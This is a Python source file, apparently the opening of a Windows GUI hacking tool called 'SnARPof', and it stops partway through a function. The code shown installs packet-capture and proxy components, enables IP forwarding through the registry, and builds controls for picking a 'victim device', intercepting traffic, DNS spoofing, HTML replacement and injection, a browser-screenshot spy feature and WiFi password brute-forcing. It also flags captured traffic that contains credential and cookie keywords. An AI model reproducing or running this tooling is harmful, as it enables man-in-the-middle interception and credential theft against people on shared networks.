import os
import io
import re
import sys
import json
import socket
import shutil
import base64
import ctypes
import tempfile
import subprocess
import threading
import webbrowser
import ipaddress
import itertools
from datetime import datetime
from datetime import timezone
from urllib.parse import urlparse, urlunparse
from string import digits, ascii_letters, punctuation
import pywifi
import tkinter
from PIL import Image, ImageTk
from tkinter import ttk, messagebox
from customtkinter import filedialog, set_appearance_mode, CTk
base_path=os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.path.dirname(os.path.abspath(__file__))
npcap_installer_path=os.path.join(base_path, 'npcap-1.87.exe')
mitmproxy_installer_path=os.path.join(base_path, 'mitmproxy-12-2-1.exe')
installed_anything=False
while not os.path.exists(os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers', 'npcap.sys')):
    messagebox.showinfo('Npcap Installation Required', 'The program needs Npcap drivers to function correctly.\n\nINSTRUCTIONS:\n1. DO NOT change the default installation path.\n2. DO NOT modify any checkboxes or options.\n3. Simply click Next and Install until the process is finished.\n\nClick OK to launch the Npcap installer.')
    subprocess.run(f'start /wait "" "{npcap_installer_path}" /winpcap_mode=yes /dot11_support=yes /admin_only=no', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    installed_anything=True
while not (any(shutil.which(cmd) for cmd in ['mitmweb', 'mitmdump', 'mitmproxy']) or os.path.exists(os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'mitmproxy', 'bin', 'mitmweb.exe'))):
    messagebox.showinfo('Mitmproxy Installation Required', 'The program needs Mitmproxy components to proceed.\n\nINSTRUCTIONS:\n1. DO NOT change the destination folder.\n2. DO NOT touch any advanced settings during the setup.\n3. Just follow the installer prompts until it says Finished.\n\nClick OK to start the Mitmproxy installation.')
    subprocess.run(f'start /wait "" "{mitmproxy_installer_path}"', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    installed_anything=True
if installed_anything:
    messagebox.showinfo('Installations Are Done', 'Installation of all components is now complete!\n\nIMPORTANT: To apply these changes, you must close this window and launch the executable (.exe) file again.\n\nThe application will now exit.')
    sys.exit(0)
from scapy.config import conf
from scapy.arch import get_if_hwaddr, get_if_addr
from scapy.interfaces import ifaces
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, ICMP, TCP, UDP, IPerror, UDPerror
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.packet import Raw, Padding
from scapy.sendrecv import srp, send, sendp, sniff
from scapy.utils import hexdump, rdpcap, wrpcap
def ip_forwarding(enable=True):
    state='Enabled' if enable else 'Disabled'
    reg_val='1' if enable else '0'
    try:
        subprocess.run(f'powershell -Command "Set-NetIPInterface -Forwarding {state} -AddressFamily IPv4"', capture_output=True, check=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" /v IPEnableRouter /t REG_DWORD /d {reg_val} /f', capture_output=True, check=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except subprocess.CalledProcessError:
        return False
class SnARPof:
    def __init__(self, master, base_path):
        self.base_path=base_path
        self.DARK_BG='#1A1A1A'
        self.LIME_FG='#39FF14'
        self.BLACK_BG='#000000'
        self.BUTTON_HOVER='#282828'
        self.html_inject_code=''
        self.all_packets=[]
        self.scapy_packets=[]
        self.filtered_packets=[]
        self.child_windows=[]
        self.wifis={}
        self.wifis_to_display=[]
        self.devices={}
        self.devices_to_display=[]
        self.dns_spoof_dict={}
        self.url_respond_dict={}
        self.html_replacer_dict={}
        self.stop_wifi_scan_event=threading.Event()
        self.stop_wifi_crack_event=threading.Event()
        self.stop_arp_scan_event=threading.Event()
        self.stop_cert_event=threading.Event()
        self.stop_intercept_event=threading.Event()
        self.sensetive_data_keywords=['username', 'user', 'uname', 'login', 'password', 'passswd', 'pwd', 'pass', 'session', 'cookie', 'auth', 'credentials']
        self.akm_map={0: 'Open', 1: 'WPA', 2: 'WPA-PSK', 3: 'WPA2', 4: 'WPA2-PSK', 5: 'WPA3-ENT', 8: 'WPA3-SAE'}
        self.cipher_map={1: 'None', 2: 'WEP', 3: 'TKIP', 4: 'CCMP (AES)', 5: 'GCMP (WPA3)'}
        self.filter_options={'Timestamp': '', 'IP version': 'both', 'IP header length': '', 'Transport header length': '', 'Protocol': 'all', 'Source address': '0.0.0.0', 'Source port': '0', 'Destination address': '0.0.0.0', 'Destination port': '0', 'Data payload': ''}
        self.temp_dir=tempfile.gettempdir()
        self.dns_rules_path=os.path.join(self.temp_dir, 'dns_rules.json')
        self.url_rules_path=os.path.join(self.temp_dir, 'url_rules.json')
        self.html_rules_path=os.path.join(self.temp_dir, 'html_rules.json')
        self.html2canvas_path=os.path.join(self.temp_dir, 'html2canvas.min.js')
        self.is_spying_path=os.path.join(self.temp_dir, 'is_spying.txt')
        self.html_inject_path=os.path.join(self.temp_dir, 'html_inject.txt')
        self.target_ip_path=os.path.join(self.temp_dir, 'target_ip.txt')
        self.snarpof_actions_path=os.path.join(self.temp_dir, 'snarpof_actions.py')
        self.mitmproxy_ca_certificate_path=os.path.join(os.path.expanduser('~'), '.mitmproxy', 'mitmproxy-ca-cert.pem')
        self.cert_installer_path=os.path.join(self.base_path, 'cert_installer.html')
        self.mitmproxy_installer_path=os.path.join(self.base_path, 'mitmproxy-12-2-1.exe')
        if os.path.exists(self.dns_rules_path):
            with open(self.dns_rules_path, 'r', encoding='utf-8') as f:
                self.dns_spoof_dict=json.load(f)
        else:
            with open(self.dns_rules_path, 'w', encoding='utf-8') as f:
                f.write('{}')
        if os.path.exists(self.url_rules_path):
            with open(self.url_rules_path, 'r', encoding='utf-8') as f:
                self.url_respond_dict=json.load(f)
        else:
            with open(self.url_rules_path, 'w', encoding='utf-8') as f:
                f.write('{}')
        if os.path.exists(self.html_rules_path):
            with open(self.html_rules_path, 'r', encoding='utf-8') as f:
                self.html_replacer_dict=json.load(f)
        else:
            with open(self.html_rules_path, 'w', encoding='utf-8') as f:
                f.write('{}')
        if os.path.exists(self.html_inject_path):
            with open(self.html_inject_path, 'r', encoding='utf-8') as f:
                self.html_inject_code=f.read()
        else:
            with open(self.html_inject_path, 'w', encoding='utf-8') as f:
                f.write('')
        with open(self.is_spying_path, 'w', encoding='utf-8') as f:
            f.write('FALSE')
        shutil.copy(os.path.join(self.base_path, 'snarpof_actions.py'), self.snarpof_actions_path)
        shutil.copy(os.path.join(self.base_path, 'html2canvas.min.js'), self.html2canvas_path)
        self.console_cp=self.get_system_cp()
        conf.use_pcap=True
        self.my_mac=''
        self.my_ip=''
        self.target_ip=''
        self.wifi=pywifi.PyWiFi()
        self.ifaces=self.wifi.interfaces()
        self.adapter=self.get_wifi_adapter_name()
        self.gateway_ip=conf.route.route('0.0.0.0')[2]
        self.wifi_scan_id=None
        self.mitm_process=None
        self.spy_socket=None
        self.cert_socket=None
        self.current_pil_image=None
        self.tk_image=None
        self.browserspy_window=None
        self.htmlrep_window=None
        self.htmlinj_window=None
        self.is_intercept=False
        self.is_htmlinj_saved=False
        self.is_mitmproxy=False
        self.is_spying=False
        self.master=master
        self.master.title('SnARPof')
        self.master.iconbitmap(os.path.join(self.base_path, 'icon.ico'))
        self.master.geometry('1700x850')
        self.master.protocol('WM_DELETE_WINDOW', lambda: self.close_all_app(self.master))
        self.style=ttk.Style(self.master)
        self.style.theme_use('default')
        self.LABEL_FONT=('Consolas', 10, 'bold')
        self.ENTRY_FONT=('Consolas', 8, 'bold')
        self.VICTIM_FONT=('Consolas', 12, 'bold')
        self.master.option_add('*TCombobox*Listbox.background', self.BLACK_BG)
        self.master.option_add('*TCombobox*Listbox.foreground', self.LIME_FG)
        self.master.option_add('*TCombobox*Listbox.selectBackground', self.LIME_FG)
        self.master.option_add('*TCombobox*Listbox.selectForeground', self.DARK_BG)
        self.master.option_add('*TCombobox*Listbox.font', self.ENTRY_FONT)
        self.master.option_add('*TCombobox*Listbox.relief', tkinter.SUNKEN)
        self.style.configure('TSeparator', background=self.LIME_FG)
        self.style.configure('TEntry', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, insertcolor=self.LIME_FG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        self.style.map('TEntry', fieldbackground=[('focus', self.BLACK_BG)], foreground=[('focus', self.LIME_FG)])
        self.style.configure('TSpinbox', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, insertcolor=self.LIME_FG, arrowcolor=self.LIME_FG, background=self.DARK_BG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        self.style.map('TSpinbox', background=[('active', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG)])
        self.style.configure('TCombobox', fieldbackground=self.BLACK_BG, foreground=self.LIME_FG, arrowcolor=self.LIME_FG, background=self.DARK_BG, borderwidth=1, bordercolor=self.LIME_FG, selectbackground=self.LIME_FG, selectforeground=self.DARK_BG)
        self.style.map('TCombobox', fieldbackground=[('readonly', self.BLACK_BG), ('focus', self.BLACK_BG)], foreground=[('readonly', self.LIME_FG), ('focus', self.LIME_FG)], background=[('active', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG)])
        self.style.configure('Treeview', background=self.BLACK_BG, foreground=self.LIME_FG, fieldbackground=self.BLACK_BG, rowheight=25, borderwidth=1, font=('Consolas', 9))
        self.style.map('Treeview', background=[('selected', self.LIME_FG)], foreground=[('selected', self.DARK_BG)])
        self.style.configure('Treeview.Heading', background=self.BLACK_BG, foreground=self.LIME_FG, font=('Consolas', 10, 'bold'), padding=[5, 5])
        self.style.map('Treeview.Heading', background=[('active', self.BUTTON_HOVER)])
        self.style.configure('TScrollbar', background=self.DARK_BG, troughcolor=self.BLACK_BG, bordercolor=self.LIME_FG, arrowcolor=self.LIME_FG, relief=tkinter.FLAT, troughrelief=tkinter.FLAT)
        self.style.map('TScrollbar', background=[('active', self.LIME_FG), ('pressed', self.LIME_FG)], arrowcolor=[('active', self.DARK_BG), ('pressed', self.DARK_BG)])
        self.style.configure('TPanedwindow', background=self.BLACK_BG)
        self.style.map('TPanedwindow', background=[('active', self.BLACK_BG)])
        self.main_frame=tkinter.Frame(self.master, bg=self.BLACK_BG, relief=tkinter.SUNKEN, borderwidth=1)
        self.main_frame.pack(fill='both', expand=True)
        tkinter.Label(self.main_frame, text='SnARPof', fg=self.LIME_FG, bg=self.BLACK_BG, font=('Consolas', 30, 'bold')).pack(pady=5)
        tkinter.Label(self.main_frame, text='Creator: Arslan Bekchanov', fg='#006400', bg=self.BLACK_BG, font=self.VICTIM_FONT).pack(pady=0)
        self.input_frame=tkinter.Frame(self.main_frame, bg=self.BLACK_BG)
        self.input_frame.pack(pady=10, fill='x', padx=20)
        for i in range(8):
            if i%2!=0:
                self.input_frame.grid_columnconfigure(i, weight=1)
            else:
                self.input_frame.grid_columnconfigure(i, weight=0)
        vcmd=self.master.register(self.validate_digit_only)
        tkinter.Label(self.input_frame, text='Victim device: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.VICTIM_FONT).grid(row=0, column=0, pady=5, sticky='e')
        self.victim_frame=tkinter.Frame(self.input_frame, bg='black')
        self.victim_frame.grid(row=0, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        self.victim_frame.grid_columnconfigure(0, weight=1)
        self.victim_frame.grid_columnconfigure(1, weight=0)
        self.victim_device=ttk.Combobox(self.victim_frame, values=self.devices_to_display, state='readonly', font=self.ENTRY_FONT, style='TCombobox')
        self.victim_device.set('ATTENTION - select victim\'s device here, list updates are paused while the dropdown is open ...')
        self.victim_device.grid(row=0, column=0, columnspan=6, padx=5, pady=5, sticky='ew')
        self.clear_devices_button=tkinter.Button(self.victim_frame, text='Clear', bg=self.BLACK_BG, fg='#00FFFF', activebackground='#00FFFF', activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground='#00FFFF', highlightcolor='#00FFFF', cursor='hand2', font=self.VICTIM_FONT, width=12, command=self.clear_victim_devices, disabledforeground='#FFD700')
        self.clear_devices_button.bind('<Enter>', lambda e: self.clear_devices_button.config(bg=self.BUTTON_HOVER))
        self.clear_devices_button.bind('<Leave>', lambda e: self.clear_devices_button.config(bg=self.BLACK_BG))
        self.clear_devices_button.grid(row=0, column=7, padx=5, pady=5, sticky='ew')
        ttk.Separator(self.input_frame, orient='horizontal', style='TSeparator').grid(row=1, column=0, columnspan=10, padx=5, pady=5, sticky='ew')
        tkinter.Label(self.input_frame, text='IP version: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=2, column=0, pady=5, sticky='e')
        self.ip_version=ttk.Combobox(self.input_frame, values=('IPv4', 'IPv6', 'both'), state='readonly', font=self.ENTRY_FONT, style='TCombobox')
        self.ip_version.set('both')
        self.ip_version.grid(row=2, column=1, padx=5, sticky='ew')
        tkinter.Label(self.input_frame, text='IP header length: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=2, column=2, pady=5, sticky='e')
        self.ip_header_length=ttk.Spinbox(self.input_frame, from_=0, to=60, validate='key', validatecommand=(vcmd, '%P'), font=self.ENTRY_FONT, wrap=True, style='TSpinbox')
        self.ip_header_length.set(0)
        self.ip_header_length.grid(row=2, column=3, padx=5, sticky='ew')
        tkinter.Label(self.input_frame, text='Transport header length: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=2, column=4, pady=5, sticky='e')
        self.transport_header_length=ttk.Spinbox(self.input_frame, from_=0, to=60, validate='key', validatecommand=(vcmd, '%P'), font=self.ENTRY_FONT, wrap=True, style='TSpinbox')
        self.transport_header_length.set(0)
        self.transport_header_length.grid(row=2, column=5, padx=5, sticky='ew')
        tkinter.Label(self.input_frame, text='Protocol: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=2, column=6, pady=5, sticky='e')
        self.protocol=ttk.Combobox(self.input_frame, values=('DHCP [client to server]', 'DHCP [server to client]', 'DNS', 'FTP [controll]', 'FTP [data transfer]', 'HTTP', 'HTTPS', 'ICMP', 'ICMPv6', 'IMAP', 'NTP', 'NetBIOS [datagram service]', 'NetBIOS [name service]', 'POP3', 'RDP', 'SMB', 'SNMP', 'SSH', 'TCP', 'TFTP', 'Telnet', 'UDP', 'all', 'unknown'), state='readonly', font=self.ENTRY_FONT, style='TCombobox')
        self.protocol.set('all')
        self.protocol.grid(row=2, column=7, padx=5, sticky='ew')
        tkinter.Label(self.input_frame, text='Source address: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=3, column=0, pady=5, sticky='e')
        self.source_address=ttk.Entry(self.input_frame, font=self.ENTRY_FONT, style='TEntry')
        self.source_address.grid(row=3, column=1, padx=5, sticky='ew')
        self.source_address.insert(tkinter.END, '0.0.0.0')
        tkinter.Label(self.input_frame, text='Source port: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=3, column=2, pady=5, sticky='e')
        self.source_port=ttk.Spinbox(self.input_frame, from_=0, to=65535, validate='key', validatecommand=(vcmd, '%P'), font=self.ENTRY_FONT, wrap=True, style='TSpinbox')
        self.source_port.set(0)
        self.source_port.grid(row=3, column=3, padx=5, sticky='ew')
        tkinter.Label(self.input_frame, text='Destination address: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=3, column=4, pady=5, sticky='e')
        self.destination_address=ttk.Entry(self.input_frame, font=self.ENTRY_FONT, style='TEntry')
        self.destination_address.grid(row=3, column=5, padx=5, sticky='ew')
        self.destination_address.insert(tkinter.END, '0.0.0.0')
        tkinter.Label(self.input_frame, text='Destination port: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=3, column=6, pady=5, sticky='e')
        self.destination_port=ttk.Spinbox(self.input_frame, from_=0, to=65535, validate='key', validatecommand=(vcmd, '%P'), font=self.ENTRY_FONT, wrap=True, style='TSpinbox')
        self.destination_port.set(0)
        self.destination_port.grid(row=3, column=7, padx=5, sticky='ew')
        tkinter.Label(self.input_frame, text='Timestamp: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=4, column=0, pady=5, sticky='e')
        self.timestamp=ttk.Entry(self.input_frame, font=self.ENTRY_FONT, style='TEntry')
        self.timestamp.grid(row=4, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        tkinter.Label(self.input_frame, text='Data payload: ', fg=self.LIME_FG, bg=self.BLACK_BG, font=self.LABEL_FONT).grid(row=5, column=0, pady=5, sticky='e')
        self.data_payload=ttk.Entry(self.input_frame, font=('Consolas', 10, 'bold'), style='TEntry')
        self.data_payload.grid(row=5, column=1, columnspan=7, padx=5, pady=5, sticky='ew')
        self.options_frame=tkinter.Frame(self.main_frame, bg=self.BLACK_BG)
        self.options_frame.pack(pady=10, fill='x', padx=20)
        for i in range(11):
            self.options_frame.grid_columnconfigure(i, weight=1)
        self.intercept_button=tkinter.Button(self.options_frame, text='Intercept', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.start_intercepting, disabledforeground='#FFD700')
        self.intercept_button.bind('<Enter>', lambda e: self.intercept_button.config(bg=self.BUTTON_HOVER))
        self.intercept_button.bind('<Leave>', lambda e: self.intercept_button.config(bg=self.BLACK_BG))
        self.intercept_button.grid(row=0, column=0, padx=10, sticky='nsew')
        self.dns_spoofer_button=tkinter.Button(self.options_frame, text='DNSpoof', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.dns_spoofer, disabledforeground='#FFD700')
        self.dns_spoofer_button.bind('<Enter>', lambda e: self.dns_spoofer_button.config(bg=self.BUTTON_HOVER))
        self.dns_spoofer_button.bind('<Leave>', lambda e: self.dns_spoofer_button.config(bg=self.BLACK_BG))
        self.dns_spoofer_button.grid(row=0, column=1, padx=10, sticky='nsew')
        self.url_responder_button=tkinter.Button(self.options_frame, text='URLresp', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.url_responder, disabledforeground='#FFD700')
        self.url_responder_button.bind('<Enter>', lambda e: self.url_responder_button.config(bg=self.BUTTON_HOVER))
        self.url_responder_button.bind('<Leave>', lambda e: self.url_responder_button.config(bg=self.BLACK_BG))
        self.url_responder_button.grid(row=0, column=2, padx=10, sticky='nsew')
        self.html_replacer_button=tkinter.Button(self.options_frame, text='HTMLrep', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.html_replacer, disabledforeground='#FFD700')
        self.html_replacer_button.bind('<Enter>', lambda e: self.html_replacer_button.config(bg=self.BUTTON_HOVER))
        self.html_replacer_button.bind('<Leave>', lambda e: self.html_replacer_button.config(bg=self.BLACK_BG))
        self.html_replacer_button.grid(row=0, column=3, padx=10, sticky='nsew')
        self.html_injector_button=tkinter.Button(self.options_frame, text='HTMLinj', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.html_injector, disabledforeground='#FFD700')
        self.html_injector_button.bind('<Enter>', lambda e: self.html_injector_button.config(bg=self.BUTTON_HOVER))
        self.html_injector_button.bind('<Leave>', lambda e: self.html_injector_button.config(bg=self.BLACK_BG))
        self.html_injector_button.grid(row=0, column=4, padx=10, sticky='nsew')
        self.mitmproxy_button=tkinter.Button(self.options_frame, text='MITMproxy', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.start_mitmproxy, disabledforeground='#FFD700')
        self.mitmproxy_button.bind('<Enter>', lambda e: self.mitmproxy_button.config(bg=self.BUTTON_HOVER))
        self.mitmproxy_button.bind('<Leave>', lambda e: self.mitmproxy_button.config(bg=self.BLACK_BG))
        self.mitmproxy_button.grid(row=0, column=5, padx=10, sticky='nsew')
        self.browserspy_button=tkinter.Button(self.options_frame, text='BrowserSpy', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.browserspy, disabledforeground='#FFD700')
        self.browserspy_button.bind('<Enter>', lambda e: self.browserspy_button.config(bg=self.BUTTON_HOVER))
        self.browserspy_button.bind('<Leave>', lambda e: self.browserspy_button.config(bg=self.BLACK_BG))
        self.browserspy_button.grid(row=0, column=6, padx=10, sticky='nsew')
        self.filter_button=tkinter.Button(self.options_frame, text='Filter', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.filter_packets, disabledforeground='#FFD700')
        self.filter_button.bind('<Enter>', lambda e: self.filter_button.config(bg=self.BUTTON_HOVER))
        self.filter_button.bind('<Leave>', lambda e: self.filter_button.config(bg=self.BLACK_BG))
        self.filter_button.grid(row=0, column=7, padx=10, sticky='nsew')
        self.clear_button=tkinter.Button(self.options_frame, text='Clear', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.clear_packets, disabledforeground='#FFD700')
        self.clear_button.bind('<Enter>', lambda e: self.clear_button.config(bg=self.BUTTON_HOVER))
        self.clear_button.bind('<Leave>', lambda e: self.clear_button.config(bg=self.BLACK_BG))
        self.clear_button.grid(row=0, column=8, padx=10, sticky='nsew')
        self.open_packets_button=tkinter.Button(self.options_frame, text='Open', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.open_packets, disabledforeground='#FFD700')
        self.open_packets_button.bind('<Enter>', lambda e: self.open_packets_button.config(bg=self.BUTTON_HOVER))
        self.open_packets_button.bind('<Leave>', lambda e: self.open_packets_button.config(bg=self.BLACK_BG))
        self.open_packets_button.grid(row=0, column=9, padx=10, sticky='nsew')
        self.save_packets_button=tkinter.Button(self.options_frame, text='Save', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.save_packets, disabledforeground='#FFD700')
        self.save_packets_button.bind('<Enter>', lambda e: self.save_packets_button.config(bg=self.BUTTON_HOVER))
        self.save_packets_button.bind('<Leave>', lambda e: self.save_packets_button.config(bg=self.BLACK_BG))
        self.save_packets_button.grid(row=0, column=10, padx=10, sticky='nsew')
        self.wifibrute_button=tkinter.Button(self.main_frame, text='WIFIbrute', bg=self.BLACK_BG, fg=self.LIME_FG, activebackground=self.LIME_FG, activeforeground=self.DARK_BG, borderwidth=1, relief=tkinter.SUNKEN, highlightbackground=self.LIME_FG, highlightcolor=self.LIME_FG, cursor='hand2', font=('Consolas', 15, 'bold'), width=12, command=self.wifibrute, disabledforeground='#FFD700')
        self.wifibrute_button.bind('<Enter>', lambda e: self.wifibrute_button.config(bg=self.BUTTON_HOVER))
        self.wifibrute_button.bind('<Leave>', lambda e: self.wifibrute_button.config(bg=self.BLACK_BG))
        self.wifibrute_button.pack(pady=10, fill='x', padx=20)
        self.main_pane=ttk.PanedWindow(self.main_frame, orient='vertical', style='TPanedwindow')
        self.main_pane.pack(fill='both', expand=True, padx=20, pady=10)
        self.tree_frame=tkinter.Frame(self.main_pane, bg=self.DARK_BG, relief=tkinter.SUNKEN)
        self.main_pane.add(self.tree_frame, weight=1)
        self.vsb=ttk.Scrollbar(self.tree_frame, orient='vertical', style='TScrollbar')
        self.packet_tree=ttk.Treeview(self.tree_frame, columns=('Time', 'Ip version', 'Ip length', 'Transport length', 'Protocol', 'Source', 'Destination', 'Payload'), show='headings', yscrollcommand=self.vsb.set, style='Treeview')
        self.vsb.config(command=self.packet_tree.yview)
        self.packet_tree.grid(row=0, column=0, sticky='nsew')
        self.vsb.grid(row=0, column=1, sticky='ns')
        self.packet_tree.tag_configure('sensetive', foreground='#00FFFF', background=self.BLACK_BG)
        self.tree_frame.grid_columnconfigure(0, weight=1)
        self.tree_frame.grid_rowconfigure(0, weight=1)
        col_widths={'Time': 150, 'Ip version': 100, 'Ip length': 100, 'Transport length': 120, 'Protocol': 80, 'Source': 150, 'Destination': 150, 'Payload': 350}
        for col, width in col_widths.items():
            self.packet_tree.column(col, width=width, anchor='center')
        self.packet_tree.heading('Time', text='Timestamp')
        self.packet_tree.heading('Ip version', text='IP version')
        self.packet_tree.heading('Ip length', text='IP length')
        self.packet_tree.heading('Transport length', text='Transport length')
        self.packet_tree.heading('Protocol', text='Protocol')
        self.packet_tree.heading('Source', text='Source')
        self.packet_tree.heading('Destination', text='Destination')
        self.packet_tree.heading('Payload', text='Data payload')
        self.packet_tree.bind('<<TreeviewSelect>>', self.show_packet_detailed)
        self.info_frame=tkinter.Frame(self.main_pane, bg=self.DARK_BG, relief=tkinter.SUNKEN)
        self.main_pane.add(self.info_frame, weight=1)
        self.v_scrollbar=ttk.Scrollbar(self.info_frame, orient='vertical', style='TScrollbar')
        self.v_scrollbar.pack(side='right', fill='y')
        self.info_terminal=tkinter.Text(self.info_frame, wrap='word', yscrollcommand=self.v_scrollbar.set, bg=self.BLACK_BG, fg=self.LIME_FG, font=('Consolas', 9), selectbackground=self.LIME_FG, selectforeground=self.BLACK_BG, state=tkinter.NORMAL, cursor='arrow')
        self.info_terminal.pack(side='left', fill='both', expand=True)
        self.info_terminal.tag_config('error', foreground='#FF0000', background=self.BLACK_BG, selectbackground='#FF0000', selectforeground=self.BLACK_BG)
        self.info_terminal.tag_config('success', foreground='#00FFFF', background=self.BLACK_BG, selectbackground='#00FFFF', selectforeground=self.BLACK_BG)
        self.info_terminal.tag_config('info_source', foreground='#FFD700', background=self.BLACK_BG, selectbackground='#FFD700', selectforeground=self.BLACK_BG)
        self.info_terminal.tag_config('info_dest', foreground='#FFD700', background=self.BLACK_BG, selectbackground='#FFD700', selectforeground=self.BLACK_BG)
        self.info_terminal.tag_config('info_sni', foreground='#FFD700', background=self.BLACK_BG, selectbackground='#FFD700', selectforeground=self.BLACK_BG)
        self.info_terminal.tag_bind('info_source', '<Enter>', lambda e: self.info_terminal.config(cursor='hand2'))
        self.info_terminal.tag_bind('info_source', '<Leave>', lambda e: self.info_terminal.config(cursor='arrow'))
        self.info_terminal.tag_bind('info_dest', '<Enter>', lambda e: self.info_terminal.config(cursor='hand2'))
        self.info_terminal.tag_bind('info_dest', '<Leave>', lambda e: self.info_terminal.config(cursor='arrow'))
        self.info_terminal.tag_bind('info_sni', '<Enter>', lambda e: self.info_terminal.config(cursor='hand2'))
        self.info_terminal.tag_bind('info_sni', '<Leave>', lambda e: self.info_terminal.config(cursor='arrow'))
        if self.adapter is None:
            self.info_terminal.insert(tkinter.END, 'ATTENTION: To make this program work, you need connect your WiFi adapter to your PC, please ReOpen the program after connecting ... \n', 'error')
        elif not self.is_connected() or self.gateway_ip=='0.0.0.0':
            self.info_terminal.insert(tkinter.END, 'ATTENTION: To make this program work, you need connect to your WiFi network, or crack some WiFi with WIFIbrute feauture, please ReOpen the program after connecting ... \n', 'error')
        else:
            self.my_mac=get_if_hwaddr(self.adapter)
            self.my_ip=socket.gethostbyname(socket.gethostname())
            self.info_terminal.insert(tkinter.END, 'NOTE: Information about traffic will display here, when you select the row, if it\'s not displaying, then click \'Filter\' button and try again ... \n')
            threading.Thread(target=self.arp_scan, args=(str(ipaddress.IPv4Network(self.my_ip+'/'+self.get_subnet_mask(), strict=False)),), daemon=True).start()
        threading.Thread(target=self.wifi_scan, daemon=True).start()
        self.info_terminal.config(state=tkinter.DISABLED)
        self.v_scrollbar.config(command=self.info_terminal.yview)
    def get_subnet_mask(self):
        result=subprocess.check_output('ipconfig', text=True, encoding=f'cp{self.console_cp}', creationflags=subprocess.CREATE_NO_WINDOW)
        for line in result.split('\n'):
